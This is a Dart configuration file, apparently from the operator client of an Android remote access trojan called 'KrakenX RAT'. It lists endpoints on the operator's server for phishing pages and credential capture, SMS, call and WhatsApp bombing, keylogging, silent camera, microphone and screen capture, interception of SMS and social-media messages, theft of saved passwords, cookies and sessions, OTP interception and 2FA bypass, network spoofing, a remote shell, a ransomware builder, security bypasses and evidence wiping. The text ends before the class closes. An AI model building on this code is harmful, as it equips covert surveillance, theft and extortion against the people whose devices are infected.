// ============================================================================
// API CONFIGURATION - KRAKENX RAT (FULL) - ULTIMATE EDITION
// ============================================================================
// ============================================================================
//  APP CONFIG — shared session
// ============================================================================
import 'apiBaseUrl.dart';
class AppConfig {
  static String? sessionKey;
}

class ApiConfig {
  // ===== TIMEOUT =====
  static const int connectionTimeout = 30;
  static const int receiveTimeout = 30;

  // ==================== MAIN APP ENDPOINTS (PORT 2061) ====================
  static const String validateEndpoint = "$apiBaseUrl/validate";
  static const String myInfoEndpoint = "$apiBaseUrl/myInfo";
  static const String changePassEndpoint = "$apiBaseUrl/changepass";
  static const String sendBugEndpoint = "$apiBaseUrl/sendBug";
  static const String createAccountEndpoint = "$apiBaseUrl/createAccount";
  static const String deleteUserEndpoint = "$apiBaseUrl/deleteUser";
  static const String getPairingEndpoint = "$apiBaseUrl/getPairing";
  static const String mySenderEndpoint = "$apiBaseUrl/mySender";
  static const String globalSendersEndpoint = "$apiBaseUrl/globalSenders";
  static const String addGlobalSenderEndpoint = "$apiBaseUrl/addGlobalSender";
  static const String confirmGlobalSenderEndpoint = "$apiBaseUrl/confirmGlobalSender";
  static const String deleteGlobalSenderEndpoint = "$apiBaseUrl/deleteGlobalSender";
  static const String addServerEndpoint = "$apiBaseUrl/addServer";
  static const String delServerEndpoint = "$apiBaseUrl/delServer";
  static const String sendCommandEndpoint = "$apiBaseUrl/sendCommand";
  static const String myServerEndpoint = "$apiBaseUrl/myServer";
  static const String spamCallEndpoint = "$apiBaseUrl/spamCall";
  static const String getInfoEndpoint = "$apiBaseUrl/getInfo";
  static const String getOnlineUsersEndpoint = "$apiBaseUrl/getOnlineUsers";
  static const String listUsersEndpoint = "$apiBaseUrl/listUsers";
  static const String userAddEndpoint = "$apiBaseUrl/userAdd";
  static const String editUserEndpoint = "$apiBaseUrl/editUser";
  static const String changeUserRoleEndpoint = "$apiBaseUrl/changeUserRole";
  static const String refreshCoinsEndpoint = "$apiBaseUrl/refreshCoins";
  static const String redeemEndpoint = "$apiBaseUrl/redeem";
  static const String giftCoinEndpoint = "$apiBaseUrl/giftCoin";
  static const String requestTopupEndpoint = "$apiBaseUrl/requestTopup";
  static const String checkTopupStatusEndpoint = "$apiBaseUrl/checkTopupStatus";
  static const String getPrivateSendersEndpoint = "$apiBaseUrl/getPrivateSenders";
  static const String getGlobalSendersEndpoint = "$apiBaseUrl/getGlobalSenders";
  static const String deleteSenderEndpoint = "$apiBaseUrl/deleteSender";
  static const String getLogEndpoint = "$apiBaseUrl/getLog";
  static const String pingEndpoint = "$apiBaseUrl/ping";
  static const String getPublicSendersEndpoint = "$apiBaseUrl/getPublicSenders";

  // ==================== PHISHING ENDPOINTS (PORT 2061) ====================
  static const String phishingCreatePage = "$apiBaseUrl/api/create-fake-page";
  static const String phishingCapture = "$apiBaseUrl/api/capture";
  static const String phishingGetCreds = "$apiBaseUrl/api/get-creds";
  static const String phishingSmsBomber = "$apiBaseUrl/api/sms-bomber";
  static const String phishingCallBomber = "$apiBaseUrl/api/call-bomber";
  static const String phishingWaRaid = "$apiBaseUrl/api/wa-raid";
  static const String phishingWaSpam = "$apiBaseUrl/api/wa-spam";

  // ==================== CHAT GLOBAL (PORT 2061) ====================
  static const String getChatMessagesEndpoint = "$apiBaseUrl/api/chat/messages";
  static const String sendChatMessageEndpoint = "$apiBaseUrl/api/chat/send";
  static const String uploadChatMediaEndpoint = "$apiBaseUrl/api/chat/upload";
  static const String getChatRoomsEndpoint = "$apiBaseUrl/api/chat/rooms";
  static const String getChatUsersEndpoint = "$apiBaseUrl/api/chat/users";
  static const String getChatHistoryEndpoint = "$apiBaseUrl/api/chat/history";
  static const String deleteChatMessageEndpoint = "$apiBaseUrl/api/chat/message";

  // ==================== AI CHAT (PORT 2061) ====================
  static const String aiChatEndpoint = "$apiBaseUrl/api/chat";

  // ==================== RAT ENDPOINTS (PORT 2073) ====================
  static const String ratPairIdEndpoint = "$apiBaseUrl/rat/pairid";
  static const String ratPairEndpoint = "$apiBaseUrl/rat/pair";
  static const String ratMyDevicesEndpoint = "$apiBaseUrl/rat/my-devices";
  static const String ratKeepaliveEndpoint = "$apiBaseUrl/api/device/keepalive";
  static const String ratSendCommandEndpoint = "$apiBaseUrl/api/send-command";
  static const String ratGetResponseEndpoint = "$apiBaseUrl/api/get-response";
  static const String ratLockChatEndpoint = "$apiBaseUrl/api/lock-chat";
  static const String ratLockAllChatsEndpoint = "$apiBaseUrl/api/lock-chat-all";
  static const String ratNotificationsEndpoint = "$apiBaseUrl/api/get-notifications";
  static const String ratLiveFrameEndpoint = "$apiBaseUrl/api/live-frame";
  static const String ratPermissionStatusEndpoint = "$apiBaseUrl/rat/permission-status";
  static const String ratSetDevicePermEndpoint = "$apiBaseUrl/setDevicePerm";
  static const String ratListDevicePermsEndpoint = "$apiBaseUrl/listDevicePerms";
  static const String ratPersistOnlineEndpoint = "$apiBaseUrl/api/device/persist-online";
  static const String ratRegisterTargetEndpoint = "$apiBaseUrl/api/register-target";
  static const String ratPairTargetEndpoint = "$apiBaseUrl/api/pair-target";
  static const String ratHeartbeatEndpoint = "$apiBaseUrl/api/heartbeat";
  static const String ratGetCommandEndpoint = "$apiBaseUrl/api/get-command";
  static const String ratPostResponseEndpoint = "$apiBaseUrl/api/post-response";
  static const String ratLiveFramePostEndpoint = "$apiBaseUrl/api/live-frame";

  // ==================== RAT ULTIMATE FEATURES ENDPOINTS ====================
  
  // ─── Keylogger ─────────────────────────────────────────────────────
  static const String ratStartKeylogger = "$apiBaseUrl/api/start-keylogger";
  static const String ratStopKeylogger = "$apiBaseUrl/api/stop-keylogger";
  static const String ratGetKeylogs = "$apiBaseUrl/api/get-keylogs";
  
  // ─── Keylogger Advanced ──────────────────────────────────────────
  static const String ratStartAdvancedKeylogger = "$apiBaseUrl/api/start-advanced-keylogger";
  static const String ratStopAdvancedKeylogger = "$apiBaseUrl/api/stop-advanced-keylogger";
  static const String ratGetKeylogsTimestamp = "$apiBaseUrl/api/get-keylogs-timestamp";
  static const String ratGetKeyloggerStats = "$apiBaseUrl/api/get-keylogger-stats";
  static const String ratClearKeylogs = "$apiBaseUrl/api/clear-keylogs";
  static const String ratExportKeylogs = "$apiBaseUrl/api/export-keylogs";
  
  // ─── Clipboard Monitor ────────────────────────────────────────────
  static const String ratStartClipboardMonitor = "$apiBaseUrl/api/start-clipboard-monitor";
  static const String ratStopClipboardMonitor = "$apiBaseUrl/api/stop-clipboard-monitor";
  static const String ratGetClipboardHistory = "$apiBaseUrl/api/get-clipboard-history";
  static const String ratClearClipboardHistory = "$apiBaseUrl/api/clear-clipboard-history";
  
  // ─── Screen Recorder ─────────────────────────────────────────────
  static const String ratStartScreenRecording = "$apiBaseUrl/api/start-screen-recording";
  static const String ratStopScreenRecording = "$apiBaseUrl/api/stop-screen-recording";
  static const String ratGetScreenRecording = "$apiBaseUrl/api/get-screen-recording";
  static const String ratStartScreenRecordingAudio = "$apiBaseUrl/api/start-screen-recording-audio";
  static const String ratTakeScreenshotSilent = "$apiBaseUrl/api/take-screenshot-silent";
  static const String ratTakeBurstScreenshots = "$apiBaseUrl/api/take-burst-screenshots";
  static const String ratTakeScreenshotMetadata = "$apiBaseUrl/api/take-screenshot-metadata";
  
  // ─── Audio Recorder ──────────────────────────────────────────────
  static const String ratStartAudioRecording = "$apiBaseUrl/api/start-audio-recording";
  static const String ratStopAudioRecording = "$apiBaseUrl/api/stop-audio-recording";
  static const String ratGetAudioRecording = "$apiBaseUrl/api/get-audio-recording";
  static const String ratStartAudioStreaming = "$apiBaseUrl/api/start-audio-streaming";
  static const String ratStopAudioStreaming = "$apiBaseUrl/api/stop-audio-streaming";
  static const String ratStartHqAudioRecording = "$apiBaseUrl/api/start-hq-audio-recording";
  static const String ratSetAudioQuality = "$apiBaseUrl/api/set-audio-quality";
  
  // ─── Video Recorder ──────────────────────────────────────────────
  static const String ratStartVideoRecording = "$apiBaseUrl/api/start-video-recording";
  static const String ratStopVideoRecording = "$apiBaseUrl/api/stop-video-recording";
  static const String ratGetVideoRecording = "$apiBaseUrl/api/get-video-recording";
  static const String ratStartBgVideoRecording = "$apiBaseUrl/api/start-bg-video-recording";
  static const String ratStartVideoStreaming = "$apiBaseUrl/api/start-video-streaming";
  static const String ratStopVideoStreaming = "$apiBaseUrl/api/stop-video-streaming";
  static const String ratTakePhotoSilent = "$apiBaseUrl/api/take-photo-silent";
  static const String ratTakePhotoExif = "$apiBaseUrl/api/take-photo-exif";
  
  // ─── Location Tracking ───────────────────────────────────────────
  static const String ratStartRealtimeLocation = "$apiBaseUrl/api/start-realtime-location";
  static const String ratStopRealtimeLocation = "$apiBaseUrl/api/stop-realtime-location";
  static const String ratGetLocationHistory = "$apiBaseUrl/api/get-location-history";
  static const String ratClearLocationHistory = "$apiBaseUrl/api/clear-location-history";
  static const String ratGetGeofenceAlerts = "$apiBaseUrl/api/get-geofence-alerts";
  static const String ratSetGeofence = "$apiBaseUrl/api/set-geofence";
  
  // ─── Call Recorder ───────────────────────────────────────────────
  static const String ratStartCallRecording = "$apiBaseUrl/api/start-call-recording";
  static const String ratStopCallRecording = "$apiBaseUrl/api/stop-call-recording";
  static const String ratGetCallRecords = "$apiBaseUrl/api/get-call-records";
  static const String ratDeleteCallRecord = "$apiBaseUrl/api/delete-call-record";
  
  // ─── SMS Intercept ───────────────────────────────────────────────
  static const String ratStartSmsInterceptor = "$apiBaseUrl/api/start-sms-interceptor";
  static const String ratStopSmsInterceptor = "$apiBaseUrl/api/stop-sms-interceptor";
  static const String ratGetSmsConversations = "$apiBaseUrl/api/get-sms-conversations";
  static const String ratSendSms = "$apiBaseUrl/api/send-sms";
  static const String ratSendSmsBulk = "$apiBaseUrl/api/send-sms-bulk";
  static const String ratDeleteAllSms = "$apiBaseUrl/api/delete-all-sms";
  
  // ─── WhatsApp Intercept ──────────────────────────────────────────
  static const String ratStartWaInterceptor = "$apiBaseUrl/api/start-wa-interceptor";
  static const String ratStopWaInterceptor = "$apiBaseUrl/api/stop-wa-interceptor";
  static const String ratGetWaMessages = "$apiBaseUrl/api/get-wa-messages";
  static const String ratGetWaContacts = "$apiBaseUrl/api/get-wa-contacts";
  static const String ratGetWaGroups = "$apiBaseUrl/api/get-wa-groups";
  static const String ratSendWaMessage = "$apiBaseUrl/api/send-wa-message";
  static const String ratGetWaStatus = "$apiBaseUrl/api/get-wa-status";
  static const String ratSetWaStatus = "$apiBaseUrl/api/set-wa-status";
  
  // ─── Telegram Intercept ──────────────────────────────────────────
  static const String ratStartTgInterceptor = "$apiBaseUrl/api/start-tg-interceptor";
  static const String ratStopTgInterceptor = "$apiBaseUrl/api/stop-tg-interceptor";
  static const String ratGetTgMessages = "$apiBaseUrl/api/get-tg-messages";
  static const String ratGetTgContacts = "$apiBaseUrl/api/get-tg-contacts";
  static const String ratGetTgGroups = "$apiBaseUrl/api/get-tg-groups";
  static const String ratSendTgMessage = "$apiBaseUrl/api/send-tg-message";
  
  // ─── Instagram Intercept ─────────────────────────────────────────
  static const String ratStartIgInterceptor = "$apiBaseUrl/api/start-ig-interceptor";
  static const String ratStopIgInterceptor = "$apiBaseUrl/api/stop-ig-interceptor";
  static const String ratGetIgMessages = "$apiBaseUrl/api/get-ig-messages";
  static const String ratSendIgMessage = "$apiBaseUrl/api/send-ig-message";
  
  // ─── Facebook Intercept ──────────────────────────────────────────
  static const String ratStartFbInterceptor = "$apiBaseUrl/api/start-fb-interceptor";
  static const String ratStopFbInterceptor = "$apiBaseUrl/api/stop-fb-interceptor";
  static const String ratGetFbMessages = "$apiBaseUrl/api/get-fb-messages";
  static const String ratSendFbMessage = "$apiBaseUrl/api/send-fb-message";
  
  // ─── Browser Intercept ───────────────────────────────────────────
  static const String ratGetBrowserBookmarks = "$apiBaseUrl/api/get-browser-bookmarks";
  static const String ratGetBrowserDownloads = "$apiBaseUrl/api/get-browser-downloads";
  static const String ratGetBrowserCookies = "$apiBaseUrl/api/get-browser-cookies";
  static const String ratGetBrowserExtensions = "$apiBaseUrl/api/get-browser-extensions";
  static const String ratGetBrowserTabs = "$apiBaseUrl/api/get-browser-tabs";
  static const String ratClearBrowserCache = "$apiBaseUrl/api/clear-browser-cache";
  static const String ratClearBrowserHistory = "$apiBaseUrl/api/clear-browser-history";
  static const String ratInjectBrowserScript = "$apiBaseUrl/api/inject-browser-script";
  static const String ratCloseBrowserTab = "$apiBaseUrl/api/close-browser-tab";
  static const String ratOpenBrowserTab = "$apiBaseUrl/api/open-browser-tab";
  
  // ─── Network Intercept ───────────────────────────────────────────
  static const String ratStartPacketCapture = "$apiBaseUrl/api/start-packet-capture";
  static const String ratStopPacketCapture = "$apiBaseUrl/api/stop-packet-capture";
  static const String ratGetPacketCapture = "$apiBaseUrl/api/get-packet-capture";
  static const String ratStartMitm = "$apiBaseUrl/api/start-mitm";
  static const String ratStopMitm = "$apiBaseUrl/api/stop-mitm";
  static const String ratScanNetwork = "$apiBaseUrl/api/scan-network";
  static const String ratGetConnectedDevices = "$apiBaseUrl/api/get-connected-devices";
  static const String ratPortScan = "$apiBaseUrl/api/port-scan";
  static const String ratArpSpoof = "$apiBaseUrl/api/arp-spoof";
  static const String ratDnsSpoof = "$apiBaseUrl/api/dns-spoof";
  static const String ratGetNetworkStats = "$apiBaseUrl/api/get-network-stats";
  static const String ratGetNetworkConnections = "$apiBaseUrl/api/get-network-connections";
  
  // ─── File System ──────────────────────────────────────────────────
  static const String ratGetFileInfo = "$apiBaseUrl/api/get-file-info";
  static const String ratGetDirectorySize = "$apiBaseUrl/api/get-directory-size";
  static const String ratCopyFile = "$apiBaseUrl/api/copy-file";
  static const String ratMoveFile = "$apiBaseUrl/api/move-file";
  static const String ratRenameFile = "$apiBaseUrl/api/rename-file";
  static const String ratCreateDirectory = "$apiBaseUrl/api/create-directory";
  static const String ratRemoveDirectory = "$apiBaseUrl/api/remove-directory";
  static const String ratZipFiles = "$apiBaseUrl/api/zip-files";
  static const String ratUnzipFiles = "$apiBaseUrl/api/unzip-files";
  static const String ratEncryptFile = "$apiBaseUrl/api/encrypt-file";
  static const String ratDecryptFile = "$apiBaseUrl/api/decrypt-file";
  
  // ─── Security ─────────────────────────────────────────────────────
  static const String ratGetSecurityLog = "$apiBaseUrl/api/get-security-log";
  static const String ratClearSecurityLog = "$apiBaseUrl/api/clear-security-log";
  static const String ratGetEncryptionKey = "$apiBaseUrl/api/get-encryption-key";
  static const String ratSetEncryptionKey = "$apiBaseUrl/api/set-encryption-key";
  static const String ratEnableSecureMode = "$apiBaseUrl/api/enable-secure-mode";
  static const String ratDisableSecureMode = "$apiBaseUrl/api/disable-secure-mode";
  static const String ratSetFirewallRule = "$apiBaseUrl/api/set-firewall-rule";
  static const String ratRemoveFirewallRule = "$apiBaseUrl/api/remove-firewall-rule";
  static const String ratGetFirewallRules = "$apiBaseUrl/api/get-firewall-rules";
  static const String ratEnableAntivirusScan = "$apiBaseUrl/api/enable-antivirus-scan";
  static const String ratGetAntivirusResult = "$apiBaseUrl/api/get-antivirus-result";
  
  // ─── User Control ────────────────────────────────────────────────
  static const String ratGetUserAccounts = "$apiBaseUrl/api/get-user-accounts";
  static const String ratCreateUserAccount = "$apiBaseUrl/api/create-user-account";
  static const String ratDeleteUserAccount = "$apiBaseUrl/api/delete-user-account";
  static const String ratChangeUserPassword = "$apiBaseUrl/api/change-user-password";
  static const String ratSetUserPermission = "$apiBaseUrl/api/set-user-permission";
  static const String ratGetUserPermissions = "$apiBaseUrl/api/get-user-permissions";
  static const String ratLockUserAccount = "$apiBaseUrl/api/lock-user-account";
  static const String ratUnlockUserAccount = "$apiBaseUrl/api/unlock-user-account";
  static const String ratEnableGuestMode = "$apiBaseUrl/api/enable-guest-mode";
  static const String ratDisableGuestMode = "$apiBaseUrl/api/disable-guest-mode";
  
  // ─── System Info ──────────────────────────────────────────────────
  static const String ratGetSystemInfo = "$apiBaseUrl/api/get-system-info";
  static const String ratGetHardwareInfo = "$apiBaseUrl/api/get-hardware-info";
  static const String ratGetOsInfo = "$apiBaseUrl/api/get-os-info";
  static const String ratGetKernelInfo = "$apiBaseUrl/api/get-kernel-info";
  static const String ratGetCpuInfo = "$apiBaseUrl/api/get-cpu-info";
  static const String ratGetMemoryInfo = "$apiBaseUrl/api/get-memory-info";
  static const String ratGetDiskInfo = "$apiBaseUrl/api/get-disk-info";
  static const String ratGetRunningTasks = "$apiBaseUrl/api/get-running-tasks";
  static const String ratKillProcess = "$apiBaseUrl/api/kill-process";
  
  // ─── Anti-Forensic / Wipe ────────────────────────────────────────
  static const String ratWipeEvidence = "$apiBaseUrl/api/wipe-evidence";
  static const String ratWipeLogs = "$apiBaseUrl/api/wipe-logs";
  static const String ratWipeCache = "$apiBaseUrl/api/wipe-cache";
  static const String ratWipeTempFiles = "$apiBaseUrl/api/wipe-temp-files";
  static const String ratWipeRecentFiles = "$apiBaseUrl/api/wipe-recent-files";
  static const String ratWipeClipboardHistory = "$apiBaseUrl/api/wipe-clipboard-history";
  static const String ratWipeSearchHistory = "$apiBaseUrl/api/wipe-search-history";
  static const String ratWipeLocationHistory = "$apiBaseUrl/api/wipe-location-history";
  static const String ratWipeCallHistory = "$apiBaseUrl/api/wipe-call-history";
  static const String ratWipeSmsHistory = "$apiBaseUrl/api/wipe-sms-history";
  static const String ratWipeAll = "$apiBaseUrl/api/wipe-all";
  
  // ─── Remote Desktop ──────────────────────────────────────────────
  static const String ratStartRemoteDesktop = "$apiBaseUrl/api/start-remote-desktop";
  static const String ratStopRemoteDesktop = "$apiBaseUrl/api/stop-remote-desktop";
  static const String ratRemoteDesktopMouse = "$apiBaseUrl/api/remote-desktop-mouse";
  static const String ratRemoteDesktopKeyboard = "$apiBaseUrl/api/remote-desktop-keyboard";
  static const String ratRemoteDesktopSendKeys = "$apiBaseUrl/api/remote-desktop-send-keys";
  static const String ratRemoteDesktopClick = "$apiBaseUrl/api/remote-desktop-click";
  static const String ratRemoteDesktopScroll = "$apiBaseUrl/api/remote-desktop-scroll";
  
  // ─── Automation ───────────────────────────────────────────────────
  static const String ratAutoTap = "$apiBaseUrl/api/auto-tap";
  static const String ratAutoSwipe = "$apiBaseUrl/api/auto-swipe";
  static const String ratAutoClick = "$apiBaseUrl/api/auto-click";
  static const String ratAutoScroll = "$apiBaseUrl/api/auto-scroll";
  static const String ratAutoType = "$apiBaseUrl/api/auto-type";
  static const String ratRecordActions = "$apiBaseUrl/api/record-actions";
  static const String ratStopRecordActions = "$apiBaseUrl/api/stop-record-actions";
  static const String ratPlayActions = "$apiBaseUrl/api/play-actions";
  static const String ratLoopActions = "$apiBaseUrl/api/loop-actions";
  static const String ratSetAutoResponse = "$apiBaseUrl/api/set-auto-response";
  static const String ratSetAutoReply = "$apiBaseUrl/api/set-auto-reply";
  
  // ─── AI Features ──────────────────────────────────────────────────
  static const String ratAiAnalyzeScreen = "$apiBaseUrl/api/ai-analyze-screen";
  static const String ratAiAnalyzePhoto = "$apiBaseUrl/api/ai-analyze-photo";
  static const String ratAiAnalyzeAudio = "$apiBaseUrl/api/ai-analyze-audio";
  static const String ratAiAnalyzeText = "$apiBaseUrl/api/ai-analyze-text";
  static const String ratAiAnalyzeLocation = "$apiBaseUrl/api/ai-analyze-location";
  static const String ratAiGenerateReport = "$apiBaseUrl/api/ai-generate-report";
  static const String ratAiSummarizeChat = "$apiBaseUrl/api/ai-summarize-chat";
  static const String ratAiTranslate = "$apiBaseUrl/api/ai-translate";
  static const String ratAiSuggestReply = "$apiBaseUrl/api/ai-suggest-reply";
  
  // ─── Password Control ─────────────────────────────────────────────
  static const String ratChangeLockPassword = "$apiBaseUrl/api/change-lock-password";
  static const String ratSetScreenLock = "$apiBaseUrl/api/set-screen-lock";
  static const String ratChangeSystemPassword = "$apiBaseUrl/api/change-system-password";
  static const String ratResetLockPassword = "$apiBaseUrl/api/reset-lock-password";
  
  // ─── Device Control ──────────────────────────────────────────────
  static const String ratSetScreenBrightness = "$apiBaseUrl/api/set-screen-brightness";
  static const String ratGetScreenBrightness = "$apiBaseUrl/api/get-screen-brightness";
  static const String ratSetAutoRotate = "$apiBaseUrl/api/set-auto-rotate";
  static const String ratSetScreenTimeout = "$apiBaseUrl/api/set-screen-timeout";
  static const String ratSetAirplaneMode = "$apiBaseUrl/api/set-airplane-mode";
  static const String ratSetWifiHotspot = "$apiBaseUrl/api/set-wifi-hotspot";
  static const String ratSetVolume = "$apiBaseUrl/api/set-volume";
  static const String ratGetVolume = "$apiBaseUrl/api/get-volume";
  
  // ─── Microphone Recording ────────────────────────────────────────
  static const String ratStartMicRecording = "$apiBaseUrl/api/start-mic-recording";
  static const String ratStopMicRecording = "$apiBaseUrl/api/stop-mic-recording";
  static const String ratGetAudio = "$apiBaseUrl/api/get-audio";
  
  // ─── Call Logs ────────────────────────────────────────────────────
  static const String ratGetCallLogs = "$apiBaseUrl/api/get-call-logs";
  
  // ─── Installed Apps ──────────────────────────────────────────────
  static const String ratGetInstalledApps = "$apiBaseUrl/api/get-installed-apps";
  
  // ─── WiFi Networks ───────────────────────────────────────────────
  static const String ratGetWifiNetworks = "$apiBaseUrl/api/get-wifi-networks";
  static const String ratConnectWifi = "$apiBaseUrl/api/connect-wifi";
  
  // ─── Device Info ─────────────────────────────────────────────────
  static const String ratGetDeviceInfo = "$apiBaseUrl/api/get-device-info";
  
  // ─── Volume Control ──────────────────────────────────────────────
  static const String ratDisableVolume = "$apiBaseUrl/api/disable-volume";
  static const String ratEnableVolume = "$apiBaseUrl/api/enable-volume";
  
  // ─── Touch Control ───────────────────────────────────────────────
  static const String ratBlockTouch = "$apiBaseUrl/api/block-touch";
  static const String ratUnblockTouch = "$apiBaseUrl/api/unblock-touch";
  
  // ─── Power Control ───────────────────────────────────────────────
  static const String ratDisablePower = "$apiBaseUrl/api/disable-power";
  static const String ratEnablePower = "$apiBaseUrl/api/enable-power";
  
  // ─── Keyboard Control ────────────────────────────────────────────
  static const String ratDisableKeyboard = "$apiBaseUrl/api/disable-keyboard";
  static const String ratEnableKeyboard = "$apiBaseUrl/api/enable-keyboard";
  
  // ─── App Management ──────────────────────────────────────────────
  static const String ratInstallApk = "$apiBaseUrl/api/install-apk";
  static const String ratClearAppData = "$apiBaseUrl/api/clear-app-data";
  static const String ratKillApp = "$apiBaseUrl/api/kill-app";
  static const String ratLockApp = "$apiBaseUrl/api/lock-app";
  static const String ratUnlockApp = "$apiBaseUrl/api/unlock-app";
  
  // ─── ADB Control ──────────────────────────────────────────────────
  static const String ratEnableAdb = "$apiBaseUrl/api/enable-adb";
  static const String ratDisableAdb = "$apiBaseUrl/api/disable-adb";
  
  // ─── System Control ──────────────────────────────────────────────
  static const String ratFactoryReset = "$apiBaseUrl/api/factory-reset";
  static const String ratLockBootloader = "$apiBaseUrl/api/lock-bootloader";
  static const String ratUnlockBootloader = "$apiBaseUrl/api/unlock-bootloader";
  static const String ratMountSystemRW = "$apiBaseUrl/api/mount-system-rw";
  static const String ratClearLogs = "$apiBaseUrl/api/clear-logs";
  static const String ratBlockNotifications = "$apiBaseUrl/api/block-notifications";
  static const String ratUnblockNotifications = "$apiBaseUrl/api/unblock-notifications";
  
  // ─── Persistence ──────────────────────────────────────────────────
  static const String ratEnablePersistence = "$apiBaseUrl/api/enable-persistence";
  static const String ratDisablePersistence = "$apiBaseUrl/api/disable-persistence";
  
  // ─── App Icon Visibility ─────────────────────────────────────────
  static const String ratHideAppIcon = "$apiBaseUrl/api/hide-app-icon";
  static const String ratShowAppIcon = "$apiBaseUrl/api/show-app-icon";
  
  // ─── Device Admin ─────────────────────────────────────────────────
  static const String ratEnableDeviceAdmin = "$apiBaseUrl/api/enable-device-admin";
  static const String ratDisableDeviceAdmin = "$apiBaseUrl/api/disable-device-admin";
  
  // ─── WiFi Control ─────────────────────────────────────────────────
  static const String ratEnableWifi = "$apiBaseUrl/api/enable-wifi";
  static const String ratDisableWifi = "$apiBaseUrl/api/disable-wifi";
  
  // ─── Flashlight ───────────────────────────────────────────────────
  static const String ratToggleFlashlight = "$apiBaseUrl/api/toggle-flashlight";
  
  // ─── Browser History ──────────────────────────────────────────────
  static const String ratGetBrowserHistory = "$apiBaseUrl/api/get-browser-history";
  
  // ─── Saved Passwords ─────────────────────────────────────────────
  static const String ratGetSavedPasswords = "$apiBaseUrl/api/get-saved-passwords";
  
  // ─── WiFi Passwords ──────────────────────────────────────────────
  static const String ratGetWifiPasswords = "$apiBaseUrl/api/get-wifi-passwords";
  
  // ─── SIM Info ─────────────────────────────────────────────────────
  static const String ratGetSimInfo = "$apiBaseUrl/api/get-sim-info";
  
  // ─── IMEI ─────────────────────────────────────────────────────────
  static const String ratGetImei = "$apiBaseUrl/api/get-imei";
  
  // ─── Root Check ───────────────────────────────────────────────────
  static const String ratCheckRoot = "$apiBaseUrl/api/check-root";
  
  // ─── Social Media Sessions ────────────────────────────────────────
  static const String ratGetWaSession = "$apiBaseUrl/api/get-wa-session";
  static const String ratGetTgSession = "$apiBaseUrl/api/get-tg-session";
  static const String ratGetInstagramSession = "$apiBaseUrl/api/get-instagram-session";
  
  // ─── Emails ───────────────────────────────────────────────────────
  static const String ratGetEmails = "$apiBaseUrl/api/get-emails";
  
  // ─── Calendar ─────────────────────────────────────────────────────
  static const String ratGetCalendar = "$apiBaseUrl/api/get-calendar";
  
  // ─── Notes ────────────────────────────────────────────────────────
  static const String ratGetNotes = "$apiBaseUrl/api/get-notes";
  
  // ─── Running Services ─────────────────────────────────────────────
  static const String ratGetRunningServices = "$apiBaseUrl/api/get-running-services";
  
  // ─── Battery History ──────────────────────────────────────────────
  static const String ratGetBatteryHistory = "$apiBaseUrl/api/get-battery-history";
  
  // ─── Recent Apps ──────────────────────────────────────────────────
  static const String ratGetRecentApps = "$apiBaseUrl/api/get-recent-apps";
  
  // ─── File Manager ─────────────────────────────────────────────────
  static const String ratBrowseFiles = "$apiBaseUrl/api/browse-files";
  static const String ratUploadFile = "$apiBaseUrl/api/upload-file";
  static const String ratDownloadFile = "$apiBaseUrl/api/download-file";
  static const String ratDeleteFile = "$apiBaseUrl/api/delete-file";

  // ==================== ULTIMATE 6 NEW FEATURES ENDPOINTS ====================
  
  // ─── Live Location Tracker ────────────────────────────────────────
  static const String ratStartLiveLocation = "$apiBaseUrl/api/start-live-location";
  static const String ratStopLiveLocation = "$apiBaseUrl/api/stop-live-location";
  static const String ratGetLiveLocation = "$apiBaseUrl/api/get-live-location";
  
  // ─── Remote Shell ─────────────────────────────────────────────────
  static const String ratSendShellCommand = "$apiBaseUrl/api/send-shell-command";
  static const String ratGetShellOutput = "$apiBaseUrl/api/get-shell-output";
  
  // ─── Overlay Attack ───────────────────────────────────────────────
  static const String ratStartOverlay = "$apiBaseUrl/api/start-overlay";
  static const String ratStopOverlay = "$apiBaseUrl/api/stop-overlay";
  
  // ─── Screen Mirroring ─────────────────────────────────────────────
  static const String ratStartScreenMirroring = "$apiBaseUrl/api/start-screen-mirroring";
  static const String ratStopScreenMirroring = "$apiBaseUrl/api/stop-screen-mirroring";
  
  // ─── WebRTC Remote Access ─────────────────────────────────────────
  static const String ratCreateWebRTCSession = "$apiBaseUrl/api/create-web-rtc-session";
  static const String ratGetWebRTCSession = "$apiBaseUrl/api/get-web-rtc-session";
  
  // ─── Ransomware Builder ───────────────────────────────────────────
  static const String ratBuildRansomware = "$apiBaseUrl/api/build-ransomware";
  static const String ratDeployRansomware = "$apiBaseUrl/api/deploy-ransomware";

  // ==================== EXTRA FEATURES - ADVANCED PERSISTENCE ====================
  
  static const String ratEnableAutoStart = "$apiBaseUrl/api/enable-auto-start";
  static const String ratDisableAutoStart = "$apiBaseUrl/api/disable-auto-start";
  static const String ratCloneSystemApp = "$apiBaseUrl/api/clone-system-app";
  static const String ratInjectFramework = "$apiBaseUrl/api/inject-framework";
  static const String ratDisablePlayProtect = "$apiBaseUrl/api/disable-play-protect";
  static const String ratBypassSELinux = "$apiBaseUrl/api/bypass-selinux";

  // ==================== EXTRA FEATURES - STEALTH & EVASION ====================
  
  static const String ratHideProcess = "$apiBaseUrl/api/hide-process";
  static const String ratFakePackage = "$apiBaseUrl/api/fake-package";
  static const String ratAntiDebugging = "$apiBaseUrl/api/anti-debugging";
  static const String ratAntiVM = "$apiBaseUrl/api/anti-vm";
  static const String ratObfuscateTraffic = "$apiBaseUrl/api/obfuscate-traffic";
  static const String ratSelfDestruct = "$apiBaseUrl/api/self-destruct";

  // ==================== EXTRA FEATURES - NETWORK MANIPULATION ====================
  
  static const String ratMitmProxy = "$apiBaseUrl/api/mitm-proxy";
  static const String ratArpPoison = "$apiBaseUrl/api/arp-poison";
  static const String ratSslStrip = "$apiBaseUrl/api/ssl-strip";
  static const String ratPacketCapture = "$apiBaseUrl/api/packet-capture";
  static const String ratTrafficRedirect = "$apiBaseUrl/api/traffic-redirect";
  static const String ratVpnKillswitch = "$apiBaseUrl/api/vpn-killswitch";
  static const String ratNetworkThrottle = "$apiBaseUrl/api/network-throttle";

  // ==================== EXTRA FEATURES - SOCIAL ENGINEERING ====================
  
  static const String ratFakeLoginInject = "$apiBaseUrl/api/fake-login-inject";
  static const String ratSessionHijack = "$apiBaseUrl/api/session-hijack";
  static const String ratCookieStealer = "$apiBaseUrl/api/cookie-stealer";
  static const String ratOtpInterceptor = "$apiBaseUrl/api/otp-interceptor";
  static const String ratBypass2FA = "$apiBaseUrl/api/bypass-2fa";

  // ==================== EXTRA FEATURES - FILE SYSTEM ====================
  
  static const String ratExtractApk = "$apiBaseUrl/api/extract-apk";
  static const String ratModifyHosts = "$apiBaseUrl/api/modify-hosts";
  static const String ratDeleteSystemApp = "$apiBaseUrl/api/delete-system-app";
  static const String ratDisableDMVerity = "$apiBaseUrl/api/disable-dm-verity";
